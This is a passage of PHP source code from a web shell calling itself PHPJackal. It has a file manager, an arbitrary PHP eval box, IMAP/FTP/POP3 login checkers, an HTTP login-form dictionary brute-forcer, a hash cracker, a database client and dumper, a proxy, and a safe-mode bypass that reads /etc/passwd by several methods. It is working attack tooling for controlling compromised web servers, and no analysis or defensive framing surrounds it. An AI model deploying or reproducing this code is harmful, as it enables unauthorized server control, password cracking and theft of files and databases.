echo "<td>";echo "<a href='#' onClick=\"javascript:chmoD('$dn')\" title='Change mode'>";echo 'D';if(is_readable($dn))echo 'R';if(is_writeable($dn))echo 'W';echo '</a></td>';
echo "<td>------</td>";
echo "<td>$diraction";
echo '</tr>';
}
foreach($file as $fn){
echo '<tr onMouseOver="this.className=\'highlight\'" onMouseOut="this.className=\'normal\'"><td style="font-weight:bold;">';
$own='Unknow';
$owner=posix_getpwuid(fileowner($fn));
$fileaction=$select.hlinK("seC=openit&namE=$fn&workingdiR=$cwd")."'>Open</option><option value='".hlinK("seC=edit&filE=$fn&workingdiR=$cwd")."'>Edit</option><option value='".hlinK("seC=fm&downloaD=$fn&workingdiR=$cwd")."'>Download</option><option value='".hlinK("seC=hex&filE=$fn&workingdiR=$cwd")."'>Hex view</option><option value='".hlinK("seC=img&filE=$fn&workingdiR=$cwd")."'>Image</option><option value='".hlinK("seC=inc&filE=$fn&workingdiR=$cwd")."'>Include</option><option value='".hlinK("seC=checksum&filE=$fn&workingdiR=$cwd")."'>Checksum</option><option value='".hlinK("seC=mailer&attacH=$fn&workingdiR=$cwd")."'>Send by mail</option><option value='".hlinK("seC=fm&workingdiR=$cwd&cP=$fn")."'>Copy</option><option value='".hlinK("seC=fm&workingdiR=$cwd&mV=$fn")."'>Move</option><option value='".hlinK("seC=fm&deL=$fn&workingdiR=$cwd")."'>Remove</option></select></td>";
$mdate=date('Y/m/d H:i:s',filemtime($fn));
$adate=date('Y/m/d H:i:s',fileatime($fn));
if($owner)$own="<a title='Shell:".$owner['shell']."' href='".hlinK('seC=fm&workingdiR='.$owner['dir'])."'>".$owner['name'].'</a>';
$size=showsizE(filesize($fn));
$type= end(explode(".", $fn));
if(!in_array($type,$ext))$type='file';
echo '<a href="'.hlinK("seC=openit&namE=$fn&workingdiR=$cwd").'"><font';
if(is_writeable($fn))echo ' color="#006600"';elseif(!is_readable($fn))echo ' color="#990000"';
echo '><img src="http://h.ackerz.com/PHPJackal/images/icon/'.$type.'" border="0" /> ';
if(strlen($fn)>29)echo substr($fn,0,26).'...';else echo $fn;echo '</font></a></td>';
echo "<td>$own</td>";
echo "<td>$mdate</td>";
echo "<td>$adate</td>";
echo "</td><td>";echo "<a href='#' onClick=\"javascript:chmoD('$fn')\" title='Change mode'>";if(is_readable($fn))echo "R";if(is_writeable($fn))echo "W";if(is_executable($fn))echo "X";if(is_uploaded_file($fn))echo "U";echo "</a></td>";
echo "<td>$size</td>";
echo "<td>$fileaction";
echo '</tr>';
}
foreach($link as $ln){
$own='Unknow';
$owner=posix_getpwuid(fileowner($ln));
$linkaction=$select.hlinK("seC=openit&namE=$ln&workingdiR=$ln")."'>Open</option><option value='".hlinK("seC=edit&filE=$ln&workingdiR=$cwd")."'>Edit</option><option value='".hlinK("seC=fm&downloaD=$ln&workingdiR=$cwd")."'>Download</option><option value='".hlinK("seC=hex&filE=$ln&workingdiR=$cwd")."'>Hex view</option><option value='".hlinK("seC=img&filE=$ln&workingdiR=$cwd")."'>Image</option><option value='".hlinK("seC=inc&filE=$ln&workingdiR=$cwd")."'>Include</option><option value='".hlinK("seC=checksum&filE=$ln&workingdiR=$cwd")."'>Checksum</option><option value='".hlinK("seC=mailer&attacH=$ln&workingdiR=$cwd")."'>Send by mail</option><option value='".hlinK("seC=fm&workingdiR=$cwd&cP=$ln")."'>Copy</option><option value='".hlinK("seC=fm&workingdiR=$cwd&mV=$ln")."'>Move</option><option value='".hlinK("seC=fm&workingdiR=$cwd&rN=$ln")."'>Rename</option><option value='".hlinK("seC=fm&deL=$ln&workingdiR=$cwd")."'>Remove</option></select></td>";
$mdate=date('Y/m/d H:i:s',filemtime($ln));
$adate=date('Y/m/d H:i:s',fileatime($ln));
if($owner)$own="<a title='Shell: ".$owner['shell']."' href='".hlinK('seC=fm&workingdiR='.$owner['dir'])."'>".$owner['name'].'</a>';
echo '<tr onMouseOver="this.className=\'highlight\'" onMouseOut="this.className=\'normal\'"><td style="font-weight:bold;">';
$size=showsizE(filesize($ln));
echo '<a href="'.hlinK("seC=openit&namE=$ln&workingdiR=$cwd").'"><font color="#';
if(is_writeable($ln))echo ' color="#006600"';elseif(!is_readable($ln))echo ' color="#990000"';
echo '><img src="http://h.ackerz.com/PHPJackal/images/icon/link" border="0" /> ';
if(strlen($ln)>29)echo substr($ln,26).'...';else echo $ln;echo '</font></a></td>';
echo "<td>$own</td>";
echo "<td>$mdate</td>";
echo "<td>$adate</td>";
echo "</td><td>";echo "<a href='#' onClick=\"javascript:chmoD('$ln')\" title='Change mode'>L";if(is_readable($ln))echo "R";if (is_writeable($ln))echo "W";if(is_executable($ln))echo "X";echo "</a></td>";
echo "<td>$size</td>";
echo "<td>$linkaction";
echo '</tr>';
}
}
$dc=count($dir)-2;
if($dc==-2)$dc=0;
$fc=count($file);
$lc=count($link);
$total=$dc+$fc+$lc;
$min=min(substr(ini_get('upload_max_filesize'),0,strpos(ini_get('post_max_size'),'M')),substr(ini_get('post_max_size'),0,strpos(ini_get('post_max_size'),'M'))).' MB';
echo '
<tr><td colspan="2">Directory summery:</td><td colspan="6">Total:'.$total.' Directories:'.$dc.' Files:'.$fc.' Links:'.$lc.' Permission:';
if (is_readable($cwd)) echo 'R';if (is_writeable($cwd)) echo 'W' ;
echo '</td><tr><td colspan="7"></td></tr><tr><td colspan="3"><form method="POST">Find:<input type="text value="$pass" name="search"><br /><input type="checkbox" name="re" value="1">Regular expressions<input type="submit" value="Find">'.$hcwd.'<input type="hidden" value="7" name="task"></form></td><td colspan="4"><form method="POST">'.$hcwd.'<input type="hidden" value="fm" name="seC"><select name="task"><option value="0">Display files and directories in current folder</option><option value="1">Find writable files and directories in current folder</option><option value="2">Find writable files in current folder</option><option value="3">Find writable directories in current folder</option><option value="4">Display all files in current folder</option><option value="5">Display all directories in current folder</option></select><input type="submit" value="Do"></form></td></tr>
</table><br />
<table border="0" cellspacing="0" cellpadding="0">
<tr>
<th>New:</th><th></th width="40"> <th>Upload:</th>
</tr>
<tr>
<td><form method="POST"><input type="text" size="20" name="newf">
<input type="submit" name="newfile" value="File"><input type="submit" name="newdir" value="Folder"></form></td>
<td width="40"> </td><td><form method="POST" enctype="multipart/form-data"><input type="file" size="15" name="uploadfile">'.$hcwd.'<input type="submit" value="Upload"><br />Note: Max allowed file size to upload on this server is '.$min.'</form></td></tr></table>';
}
function imapchecK($host,$username,$password,$timeout){
$sock=fsockopen($host,143,$n,$s,$timeout);
$b=uniqid('NJ');
$l=strlen($b);
if(!$sock)return -1;
fread($sock,1024);
fputs($sock,"$b LOGIN $username $password\r\n");
$res=fgets($sock,$l+4);
fclose($sock);
if($res=="$b OK")return 1;else return 0;
}
function ftpchecK($host,$username,$password,$timeout){
$ftp=ftp_connect($host,21,$timeout);
if(!$ftp)return -1;
$con=ftp_login($ftp,$username,$password);
if($con)return 1;else return 0;
}
function pop3checK($server,$user,$pass,$timeout){
$sock=fsockopen($server,110,$en,$es,$timeout);
if(!$sock)return -1;
fread($sock,1024);
fwrite($sock,"user $user\n");
$r=fgets($sock);
if($r{0}=='-')return 0;
fwrite($sock,"pass $pass\n");
$r=fgets($sock);
fclose($sock);
if($r{0}=='+')return 1;
return 0;
}
function formcrackeR(){
global $hcwd;
if(!empty($_REQUEST['start'])){
if(isset($_REQUEST['loG'])&& !empty($_REQUEST['logfilE'])){$log=1;$file=$_REQUEST['logfilE'];}else $log=0;
$url=$_REQUEST['target'];
$uf=$_REQUEST['userf'];
$pf=$_REQUEST['passf'];
$sf=$_REQUEST['submitf'];
$sv=$_REQUEST['submitv'];
$method=$_REQUEST['method'];
$fail=$_REQUEST['fail'];
$dic=$_REQUEST['dictionary'];
$type=$_REQUEST['combo'];
$user=(!empty($_REQUEST['user']))?$_REQUEST['user']:'';
if(!file_exists($dic)){echo "Can not open dictionary."; return;}
$dictionary=fopen($dic,'r');
echo '<font color=blue>Cracking started...<br>';
while(!feof($dictionary)){
if($type){
$combo=trim(fgets($dictionary)," \n\r");
$user=substr($combo,0,strpos($combo,':'));
$pass=substr($combo,strpos($combo,':')+1);
}else{
$pass=trim(fgets($dictionary)," \n\r");
}
$url.="?$uf=$user&$pf=$pass&$sf=$sv";
$res=check_urL($url,$method,$fail,12);
if(!$res){echo "<font color=blue>U: $user P: $pass</font><br>";if($log)file_add_contentS($file,"U: $user P: $pass\r\n");if(!$type)break;}
}
fclose($dictionary);
echo 'Done!</font><br>';
}
else echo '<form name=cracker method="POST">
<div class="fieldwrapper">
<label class="styled" style="width:320px">HTTP Form cracker</label>
</div><div class="fieldwrapper">
<label class="styled">Dictionary:</label>
<div class="thefield">
<input type="text" name="dictionary" size="30" />
</div>
</div><div class="fieldwrapper">
<label class="styled">Dictionary type:</label>
<div class="thefield">
<ul style="margin-top:0;">
<li><input type="radio" value="0" checked name="combo" onClick="document.cracker.user.disabled = false;" /> <label>Simple (P)</label></li>
<li><input type="radio" name="combo" value="1" onClick="document.cracker.user.disabled = true;" /> <label>Combo (U:P)</label></li>
</ul>
</div>
</div><div class="fieldwrapper">
<label class="styled">Username:</label>
<div class="thefield">
<input type="text" name="user" value="admin" size="30" />
</div>
</div><div class="fieldwrapper">
<label class="styled">Action:</label>
<div class="thefield">
<input type="text" name="target" value="http://'.getenv('HTTP_HOST').'/login.php" size="30" />
</div>
</div><div class="fieldwrapper">
<label class="styled">Method:</label>
<div class="thefield">
<select name="method"><option selected value="POST">POST</option><option value="GET">GET</option></select>
</div>
</div><div class="fieldwrapper">
<label class="styled">Username field:</label>
<div class="thefield">
<input type="text" name="userf" value="username" size="30" />
</div>
</div><div class="fieldwrapper">
<label class="styled">Password field:</label>
<div class="thefield">
<input type="text" name="passf" value="passwd" size="30" />
</div>
</div><div class="fieldwrapper">
<label class="styled">Submit name:</label>
<div class="thefield">
<input type="text" name="submitf" value="submit" size="30" />
</div>
</div><div class="fieldwrapper">
<label class="styled">Submit value:</label>
<div class="thefield">
<input type="text" name="submitv" value="Login" size="30" />
</div>
</div><div class="fieldwrapper">
<label class="styled">Fail string:</label>
<div class="thefield">
<input type="text" name="fail" value="Try again" size="30" />
</div>
</div><div class="fieldwrapper">
<label class="styled"><input type=checkbox name=loG value=1 onClick="document.cracker.logfilE.disabled = !document.cracker.logfilE.disabled;" checked> Log:</label>
<div class="thefield">
<input type=text name=logfilE size=25 value="'.whereistmP().DIRECTORY_SEPARATOR.'.log">
</div>
</div>
'.$hcwd.'
<div class="buttonsdiv">
<input type="submit" name="start" value="Start" style="margin-left: 150px;" />
</div>
</form>';
}
function hashcrackeR(){
global $hcwd;
if(!empty($_REQUEST['hash']) && !empty($_REQUEST['dictionary']) && !empty($_REQUEST['type'])){
if(isset($_REQUEST['loG'])&& !empty($_REQUEST['logfilE'])){$log=1;$file=$_REQUEST['logfilE'];}else $log=0;
$dictionary=fopen($_REQUEST['dictionary'],'r');
if($dictionary){
$hash=strtoupper($_REQUEST['hash']);
echo '<font color=blue>Cracking '.htmlspecialchars($hash).'...<br>';
$type=$_REQUEST['type'];
while(!feof($dictionary)){
$word=trim(fgets($dictionary)," \n\r");
if($type=='ntlm'){
$word=iconv('UTF-8','UTF-16LE',$word);
$type='md4';
}
if($hash==strtoupper((hash($type,$word)))){echo "The answer is $word<br>";if($log)file_add_contentS($file,"$x\r\n");break;}
}
echo 'Done!</font>';
fclose($dictionary);
}
else{
echo "Can not open dictionary.";
}
}
echo '
<form method="POST" name="hashform" class="form"><div class="fieldwrapper"><label class="styled" style="width:320px">Hash cracker</label></div><div class="fieldwrapper"><label class="styled">Dictionary:</label><div class="thefield"><input type="text" name="dictionary" size="30" /></div></div><div class="fieldwrapper"><label class="styled">Hash:</label><div class="thefield"><input type="text" name="hash" size="30" /></div></div><div class="fieldwrapper"><label class="styled">Type:</label><div class="thefield"><select name=type><option value=md2>MD2</option><option value=md4>MD4</option><option selected value=md5>MD5</option><option value=ntlm>NTLM</option><option value=sha1>SHA1</option><option value=sha224>SHA224</option><option value=sha256>SHA256</option><option value=sha384>SHA384</option><option value=sha512>SHA512</option></select></div></div><div class="fieldwrapper"><label class="styled"><input type=checkbox name=loG value=1 onClick="document.hashform.logfilE.disabled = !document.hashform.logfilE.disabled;" checked> Log:</label><div class="thefield"><input type=text name=logfilE size=25 value="'.whereistmP().DIRECTORY_SEPARATOR.'.log"></div></div>'.$hcwd.'<input type="submit" value="Crack" style="margin-left: 150px;" /></div></form>';
}
function pr0xy(){
global $hcwd;
echo '<img src="http://h.ackerz.com/PHPJackal/images/pr0xy.png" style="border: none; margin: 0;" /><br /><br /><form method="POST" class="feedbackform"><div class="fieldwrapper"><label class="styled">Navigator:</label><div class="thefield"><input type="text" name="urL" value="';if(empty($_REQUEST['urL'])) echo 'http://showip.com'; else echo htmlspecialchars($_REQUEST['urL']);echo '" size="30" /></div></div>'.$hcwd.'<div class="buttonsdiv"><input type="submit" value="Go" style="margin-left: 150px;" /></div></form>';
if(!empty($_REQUEST['urL'])){
$u=parse_url($_REQUEST['urL']);
$host=$u['host'];$file=(!empty($u['path']))?$u['path']:'/';
$dir=dirname($file);
$con=getiT($_REQUEST['urL']);
$s=array("href=mailto"=>"HrEf=mailto","HREF=mailto"=>"HrEf=mailto","href='mailto"=>"HrEf=\"mailto","HREF=\"mailto"=>"HrEf=\"mailto","href=\'mailto"=>"HrEf=\"mailto","HREF=\'mailto"=>"HrEf=\"mailto","href=\"http"=>"HrEf=\"".hlinK("seC=px&urL=http"),"href=\'http"=>"HrEf=\"".hlinK("seC=px&urL=http"),"HREF=\'http"=>"HrEf=\"".hlinK("seC=px&urL=http"),"href=http"=>"HrEf=".hlinK("seC=px&urL=http"),"HREF=http"=>"HrEf=".hlinK("seC=px&urL=http"),"href=\""=>"HrEf=\"".hlinK("seC=px&urL=http://$host/$dir/"),"HREF=\""=>"HrEf=\"".hlinK("seC=px&urL=http://$host/$dir/"),"href=\""=>"HrEf=\'".hlinK("seC=px&urL=http://$host/$dir/"),'HREF="'=>'HrEf="'.hlinK("seC=px&urL=http://$host/$dir/"),"href="=>"HrEf=".hlinK("seC=px&urL=http://$host/$dir/"),"HREF="=>"HrEf=".hlinK("seC=px&urL=http://$host/$dir/"));
$con=replace_stR($s,$con);
echo $con;
}
}
function sqlclienT(){
global $hcwd;
echo '<img src="http://h.ackerz.com/PHPJackal/images/sql.png" style="border: none; margin: 0;" /><br /><br />';
if(!empty($_REQUEST['serveR']) && !empty($_REQUEST['useR']) && isset($_REQUEST['pasS']) && !empty($_REQUEST['querY'])){
$server=$_REQUEST['serveR'];$type=$_REQUEST['typE'];$pass=$_REQUEST['pasS'];$user=$_REQUEST['useR'];$query=$_REQUEST['querY'];
$db=(empty($_REQUEST['dB']))?'':$_REQUEST['dB'];
$res=querY($type,$server,$user,$pass,$db,$query);
if($res){
$res=str_replace('|-|-|-|-|-|','</td><td>',$res);
$res=str_replace('|+|+|+|+|+|','</td></tr><tr onMouseOver="this.className=\'highlight\'" onMouseOut="this.className=\'normal\'"><td>',$res);
$r=explode('[+][+][+]',$res);
$r[1]=str_replace('[-][-][-]',"</th><th>",$r[1]);
echo '<table border="0" cellspacing="0" cellpadding="0"><tr><th>'.$r[1].'</th></tr><tr onMouseOver="this.className=\'highlight\'" onMouseOut="this.className=\'normal\'"><td>'.$r[0]."</td></tr></table><br />";
}
else{
echo "Failed!<br />";
}
}
if(empty($_REQUEST['typE']))$_REQUEST['typE']='';
echo '
<form name=client method="POST">
<div class="fieldwrapper">
<label class="styled" style="width:320px">SQL client</label>
</div><div class="fieldwrapper">
<label class="styled">Type:</label>
<div class="thefield">
<select name="typE">
<option valut=MySQL onClick="document.client.serveR.disabled = false;" ';if ($_REQUEST['typE']=='MySQL')echo 'selected';echo '>MySQL</option><option valut=MSSQL onClick="document.client.serveR.disabled = false;" ';if ($_REQUEST['typE']=='MSSQL')echo 'selected';echo '>MSSQL</option><option valut=Oracle onClick="document.client.serveR.disabled = true;" ';if ($_REQUEST['typE']=='Oracle')echo 'selected';echo ">Oracle</option><option valut=PostgreSQL onClick='document.client.serveR.disabled = false;' ";if ($_REQUEST['typE']=='PostgreSQL')echo "selected";echo '>PostgreSQL</option>
</select>
</div>
</div><div class="fieldwrapper">
<label class="styled">Server:</label>
<div class="thefield">
<input type="text" name="serveR" value="';if (!empty($_REQUEST['serveR'])) echo htmlspecialchars($_REQUEST['serveR']);else echo 'localhost'; echo '" size="30" />
</div>
</div><div class="fieldwrapper">
<label class="styled">Username:</label>
<div class="thefield">
<input type="text" name="useR" value="';if (!empty($_REQUEST['useR'])) echo htmlspecialchars($_REQUEST['useR']);else echo 'root'; echo '" size="30" />
</div>
</div><div class="fieldwrapper">
<label class="styled">Password:</label>
<div class="thefield">
<input type="text" name="pasS" value="';if (isset($_REQUEST['pasS'])) echo htmlspecialchars($_REQUEST['pasS']);else echo '123456'; echo '" size="30" />
</div>
</div><div class="fieldwrapper">
<label class="styled">Database:</label>
<div class="thefield">
<input type="text" name="dB" value="';if (isset($_REQUEST['dB'])) echo htmlspecialchars($_REQUEST['dB']); echo '" size="30" />
</div>
</div> <div class="fieldwrapper">
<label class="styled">Query:</label>
<div class="thefield">
<textarea name="querY">';if (!empty($_REQUEST['querY'])) echo htmlspecialchars(($_REQUEST['querY']));else echo 'SHOW DATABASES'; echo '</textarea>
</div>
</div>'.
$hcwd.'
<div class="buttonsdiv">
<input type="submit" value="Query" style="margin-left: 150px;" />
</div></form>';
}
function querY($type,$host,$user,$pass,$db='',$query){
$res='';
switch($type){
case 'MySQL':
if(!function_exists('mysql_connect'))return 0;
$link=mysql_connect($host,$user,$pass);
if($link){
if(!empty($db))mysql_select_db($db,$link);
$result=mysql_query($query,$link);
while($data=mysql_fetch_row($result))$res.=implode('|-|-|-|-|-|',$data).'|+|+|+|+|+|';
$res.='[+][+][+]';
for($i=0;$i<mysql_num_fields($result);$i++)
$res.=mysql_field_name($result,$i).'[-][-][-]';
mysql_close($link);
return $res;
}
break;
case 'MSSQL':
if(!function_exists('mssql_connect'))return 0;
$link=mssql_connect($host,$user,$pass);
if($link){
if(!empty($db))mssql_select_db($db,$link);
$result=mssql_query($query,$link);
while($data=mssql_fetch_row($result))$res.=implode('|-|-|-|-|-|',$data).'|+|+|+|+|+|';
$res.='[+][+][+]';
for($i=0;$i<mssql_num_fields($result);$i++)
$res.=mssql_field_name($result,$i).'[-][-][-]';
mssql_close($link);
return $res;
}
break;
case 'Oracle':
if(!function_exists('ocilogon'))return 0;
$link=ocilogon($user,$pass,$db);
if($link){
$stm=ociparse($link,$query);
ociexecute($stm,OCI_DEFAULT);
while($data=ocifetchinto($stm,$data,OCI_ASSOC+OCI_RETURN_NULLS))$res.=implode('|-|-|-|-|-|',$data).'|+|+|+|+|+|';
$res.='[+][+][+]';
for($i=0;$i<oci_num_fields($stm);$i++)
$res.=oci_field_name($stm,$i).'[-][-][-]';
return $res;
}
break;
case 'PostgreSQL':
if(!function_exists('pg_connect'))return 0;
$link=pg_connect("host=$host dbname=$db user=$user password=$pass");
if($link){
$result=pg_query($link,$query);
while($data=pg_fetch_row($result))$res.=implode('|-|-|-|-|-|',$data).'|+|+|+|+|+|';
$res.='[+][+][+]';
for($i=0;$i<pg_num_fields($result);$i++)
$res.=pg_field_name($result,$i).'[-][-][-]';
pg_close($link);
return $res;
}
break;
}
return 0;
}
function phpevaL(){
global $hcwd;
echo '<img src="http://h.ackerz.com/PHPJackal/images/evaler.png" style="border: none; margin: 0;" /><br /><br /><form class="form" method="POST">';
if(!empty($_REQUEST['code'])){
echo '<div class="fieldwrapper"><label class="styled">Output:</label><div class="thefield"><pre>';
$s=array('<?php'=>'','<?='=>'','<?'=>'','?>'=>''); echo htmlspecialchars(eval(replace_stR($s,$_REQUEST['code']))).'</pre>
</div></div>';}echo '<div class="fieldwrapper"><label class="styled">Code:</label><div class="thefield">
<textarea name="code">';if(!empty($_REQUEST['code']))echo htmlspecialchars($_REQUEST['code']);else echo 'for($J=0;$J<10;$J++){for($I=0;$I<10;$I++)echo "FREEDOM! ";echo "\r\n";}';echo '</textarea>
</div></div>'.$hcwd.'<div class="buttonsdiv"><input type="submit" value="Execute" style="margin-left: 150px;" /></div></form>';
}
function toolS(){
global $hcwd,$cwd;
echo '<img src="http://h.ackerz.com/PHPJackal/images/tools.png" style="border: none; margin: 0;" /><br /><br />';
if(!empty($_REQUEST['serveR']) && !empty($_REQUEST['domaiN'])){
$ser=fsockopen($_REQUEST['serveR'],43,$en,$es,5);
fputs($ser,$_REQUEST['domaiN']."\r\n");
echo '<pre>';
while(!feof($ser))echo fgets($ser,1024);
echo '</pre>';
fclose($ser);
}
elseif(!empty($_REQUEST['serveR']) && !empty($_REQUEST['dB']) && !empty($_REQUEST['useR']) && !empty($_REQUEST['pasS']) && !empty($_REQUEST['ouT'])){
$Link=mysql_connect($_REQUEST['serveR'],$_REQUEST['useR'],$_REQUEST['pasS']);
$DB=$_REQUEST['dB'];
$Dump="/*
Dump generated by PHPJackal
Website: http://h.ackerz.com
*/


DROP DATABASE IF EXISTS `$DB`;
CREATE DATABASE `$DB`;

";
mysql_select_db($DB,$Link);
$result=mysql_query("SHOW TABLES",$Link);
$table=array();
while($data=mysql_fetch_row($result)) $table[]=$data[0];
foreach($table as $t){
$Dump.= "DROP TABLE IF EXISTS `$t`;
";
$result=mysql_query("SHOW CREATE TABLE `$t`",$Link);
while($data=mysql_fetch_row($result)){
$Dump.= $data[1].";\n\n";
}
$sql="select * from `$t`;";
$result=mysql_query($sql);
$num_rows= mysql_num_rows($result);
$num_fields= mysql_num_fields($result);
if( $num_rows> 0) {
$field_type=array();
$i=0;
while( $i <$num_fields)
{
$meta= mysql_fetch_field($result, $i);
array_push($field_type, $meta->type);
$i++;
} 
$Dump.=  "INSERT INTO `$t` VALUES";
$index=0;
while( $row= mysql_fetch_row($result))
{
$Dump.= "(";
for( $i=0; $i <$num_fields; $i++)
{
if( is_null( $row[$i]))
$Dump.=  "null";
else
{
switch( $field_type[$i])
{
case 'int':
$Dump.=   $row[$i];
break;
case 'string':
case 'blob' :
default:
$Dump.=   "'".mysql_real_escape_string($row[$i])."'";
}
}
if( $i <$num_fields-1)
$Dump.= ",";
}
$Dump.= ")";
if( $index <$num_rows-1)
$Dump.= ",";
else
$Dump.= ";";
$Dump.= "\n";
$index++;
}
}
}
file_put_contents($_REQUEST['ouT'],$Dump);
echo "<b>Done! </b>[<a href=\"".hlinK("workingdiR=".dirname($_REQUEST['ouT'])."&downloaD=".basename($_REQUEST['ouT']))."\">Download</a>]<br />";
}
elseif(!empty($_REQUEST['urL'])){
$h='';
$u=parse_url($_REQUEST['urL']);
$host=$u['host'];$file=(!empty($u['path']))?$u['path']:'/';$port=(empty($u['port']))?80:$u['port'];
$ser=fsockopen($host,$port,$en,$es,5);
if($ser){
fputs($ser,"GET $file HTTP/1.0\r\nAccept-Encoding: text\r\nHost: $host\r\nReferer: $host\r\nUser-Agent: Mozilla/5.0 (compatible; Konqueror/3.1; FreeBSD)\r\n\r\n");
echo '<pre>';
while($h!="\r\n"){$h=fgets($ser,1024);echo $h;}
echo '</pre>';
fclose($ser);
}
}
elseif(!empty($_REQUEST['ouT']) && isset($_REQUEST['pW'])&& !empty($_REQUEST['uN'])){
$htpasswd=$_REQUEST['ouT'].DIRECTORY_SEPARATOR.'.htpasswd';
$htaccess=$_REQUEST['ouT'].DIRECTORY_SEPARATOR.'.htaccess';
file_put_contents($htpasswd,$_REQUEST['uN'].':'.crypt(trim($_REQUEST['pW']),CRYPT_STD_DES));
file_put_contents($htaccess,"AuthName \"Secure\"\r\nAuthType Basic\r\nAuthUserFile $htpasswd\r\nRequire valid-user\r\n");
echo 'Done';
}
echo '
<form method="POST" class="feedbackform"><div class="fieldwrapper">
<label class="styled" style="width:320px">MySQL Dump</label>
</div>
<div class="fieldwrapper">
<label class="styled">Server:</label>
<div class="thefield">
<input type="text" name=serveR value="';if (!empty($_REQUEST['serveR'])) echo htmlspecialchars($_REQUEST['serveR']);
else echo 'localhost';echo '" size="30" />
</div>
</div>
<div class="fieldwrapper">
<label class="styled">Database:</label>
<div class="thefield">
<input type="text" name=dB value="';if (!empty($_REQUEST['dB'])) echo htmlspecialchars($_REQUEST['dB']);
else echo 'users';echo '" size="30" />
</div>
</div>
<div class="fieldwrapper">
<label class="styled">Username:</label>
<div class="thefield">
<input type="text" name=useR value="';if (!empty($_REQUEST['useR'])) echo htmlspecialchars($_REQUEST['useR']);
else echo 'root';echo '" size="30" />
</div>
</div>
<div class="fieldwrapper">
<label class="styled">Password:</label>
<div class="thefield">
<input type="text" name=pasS value="';if (!empty($_REQUEST['pasS'])) echo htmlspecialchars($_REQUEST['pasS']);
else echo '123456';echo '" size="30" />
</div>
</div>
<div class="fieldwrapper">
<label class="styled">Output:</label>
<div class="thefield">
<input type="text" name=ouT value="';if (!empty($_REQUEST['ouT'])) echo htmlspecialchars($_REQUEST['ouT']);
else echo whereistmP().'/dump.sql';echo '" size="30" />
</div>
</div>
'.$hcwd.'<div class="buttonsdiv">
<input type="submit" value="Dump" style="margin-left: 150px;" />
</div></form><br />
<form method="POST" class="feedbackform"><div class="fieldwrapper">
<label class="styled" style="width:320px">Whois</label>
</div>
<div class="fieldwrapper">
<label class="styled">Server:</label>
<div class="thefield">
<input type="text" name=serveR value="';if (!empty($_REQUEST['serveR'])) echo htmlspecialchars($_REQUEST['serveR']);
else echo 'whois.geektools.com';echo '" size="30" />
</div>
</div>
<div class="fieldwrapper">
<label class="styled">Domain:</label>
<div class="thefield">
<input type="text" name=domaiN value="';if (!empty($_REQUEST['domaiN'])) echo htmlspecialchars($_REQUEST['domaiN']);
else echo 'google.com';echo '" size="30" />
</div>
</div>'.$hcwd.'<div class="buttonsdiv">
<input type="submit" value="Whois" style="margin-left: 150px;" />
</div></form>
<br />
<form method="POST" class="feedbackform"><div class="fieldwrapper">
<label class="styled" style="width:320px">.ht* generator</label>
</div>
<div class="fieldwrapper">
<label class="styled">Username:</label>
<div class="thefield">
<input type="text" name=uN value="';if (!empty($_REQUEST['uN'])) echo htmlspecialchars($_REQUEST['uN']);
else echo 'r00t';echo '" size="30" />
</div>
</div>
<div class="fieldwrapper">
<label class="styled">Password:</label>
<div class="thefield">
<input type="text" name=pW value="';if (!empty($_REQUEST['pW']))echo htmlspecialchars($_REQUEST['pW']);
else echo uniqid('@');echo '" size="30" />
</div>
</div>
<div class="fieldwrapper">
<label class="styled">Directory:</label>
<div class="thefield">
<input type="text" name=ouT value="';if (!empty($_REQUEST['ouT'])) echo htmlspecialchars($_REQUEST['ouT']);
else echo $cwd;echo '" size="30" />
</div>
</div>'.$hcwd.'<div class="buttonsdiv">
<input type="submit" value="Generate" style="margin-left: 150px;" />
</div></form>
<br />
<form method="POST" class="feedbackform"><div class="fieldwrapper">
<label class="styled" style="width:320px">Header grabber</label>
</div>
<div class="fieldwrapper">
<label class="styled">URL:</label>
<div class="thefield">
<input type="text" name=urL value="';if (!empty($_REQUEST['urL'])) echo htmlspecialchars($_REQUEST['urL']);
else echo 'http://h.ackerz.com/index.php';echo '" size="30" />
</div>
</div>'
.$hcwd.'<div class="buttonsdiv">
<input type="submit" value="Get" style="margin-left: 150px;" />
</div></form>';}
function hexvieW(){
if(!empty($_REQUEST['filE'])){
$f=$_REQUEST['filE'];
echo "<table border=0 style='border-collapse: collapse' width='100%'><th width='10%' bgcolor='#282828'>Offset</th><th width='25%' bgcolor='#282828'>Hex</th><th width='25%' bgcolor='#282828'></th><th width='40%' bgcolor='#282828'>ASCII</th></tr>";
$file=fopen($f,'r');
$i=-1;
while(!feof($file)){
$ln='';
$i++;
echo "<tr><td width='10%' bgcolor='#";
if($i % 2==0)echo '666666';else echo '808080';
echo "'>";echo str_repeat('0',(8-strlen(dechex($i*16)))).dechex($i*16);echo '</td>';
echo "<td width='25%' bgcolor='#";
if($i % 2==0)echo '666666';else echo '808080'; 
echo "'>";
for($j=0;$j<=7;$j++){
if(!feof($file)){
$tmp=strtoupper(dechex(ord(fgetc($file))));
if(strlen($tmp)==1)$tmp='0'.$tmp;
echo $tmp.' ';
$ln.=$tmp;
}
}
echo "</td><td width='25%' bgcolor='#";
if($i % 2==0)echo '666666';else echo '808080';
echo "'>";
for($j=7;$j<=14;$j++){
if(!feof($file)){
$tmp=strtoupper(dechex(ord(fgetc($file))));
if(strlen($tmp)==1)$tmp='0'.$tmp;
echo $tmp.' ';
$ln.=$tmp;
}
}
echo "</td><td width='40%' bgcolor='#";
if($i % 2==0)echo '666666';else echo '808080';
echo "'>";
$n=0;$asc='';$co=0;
for($k=0;$k<=16;$k++){
$co=hexdec(substr($ln,$n,2));
if(($co<=31)||(($co>=127)&&($co<=160)))$co=46;
$asc.=chr($co);
$n+=2;
}
echo htmlspecialchars($asc);
echo '</td></tr>';
}
}
fclose($file);
echo '</table>';
}
function safemodE(){
global $windows,$hcwd;
$file=(empty($_REQUEST['file']))?'/etc/passwd':$_REQUEST['file'];
$pr="\r\n</font><font color=green>Method ";
$po=")</font><font color=blue>\r\n";
$i=1;
echo '<img src="http://h.ackerz.com/PHPJackal/images/safemode.png" style="border: none; margin: 0;" /><br /><br />';
if(!empty($_REQUEST['read'])){
echo "<pre>$pr$i:(ini_restore$po";
ini_restore('safe_mode');ini_restore('open_basedir');
readfile($file);
$i++;
echo "$pr$i:(include$po";
include($file);
$i++;
echo "$pr$i:(copy$po";
$tmp=tempnam('','cx');
copy('compress.zlib://'.$file,$tmp);
$fh=fopen($tmp,'r');
$data=fread($fh,filesize($tmp));
fclose($fh);
echo $data;
$i++;
if(function_exists('mb_send_mail')){
echo "$pr$i:(mb_send_mail$po";
if(file_exists('/tmp/mb_send_mail'))unlink('/tmp/mb_send_mail');
